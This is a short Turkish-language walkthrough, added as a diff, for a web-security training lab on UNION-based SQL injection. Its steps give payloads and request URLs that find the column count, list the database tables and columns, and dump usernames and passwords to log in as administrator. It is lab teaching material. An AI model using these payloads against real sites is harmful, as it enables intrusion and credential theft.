@@ -1,0 +1,24 @@
+LAB: SQL injection attack, listing the database contents on non-Oracle databases
+
+1 - Herhangi bir kategoriyi seçiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Lifestyle
+
+2 - ' ORDER BY 1-- payloadı ile sütun sayısına ulaşıyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Lifestyle%27%20ORDER%20BY%202--
+
+3 - '+UNION+SELECT+'abc','def'-- payloadı ile 2 sütununda türünün string olduğunu görüyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+%27abc%27,%27def%27--
+
+4 - '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- payloadı ile database üzerindeki tüm tabloları listeliyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+
+5 - '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_egkpvp'--
+bu payloaddaki table_name='' kısmını kendini çıktınıza göre uyarlamanız gerekiyor. 
+users_egkvp tablosundaki sütun adlarını yazdırdık.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_egkpvp%27--
+
+6 - '+UNION+SELECT+username_kuvpli,+password_wthnca+FROM+users_egkpvp--
+users_egkvp tablosundan username_kuvpli ve password_wthnca sütunlarıdaki verileri yazdırdık.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+username_kuvpli,+password_wthnca+FROM+users_egkpvp--
+
+7 - Administrator ile giriş yapınca oda çözülüyor.
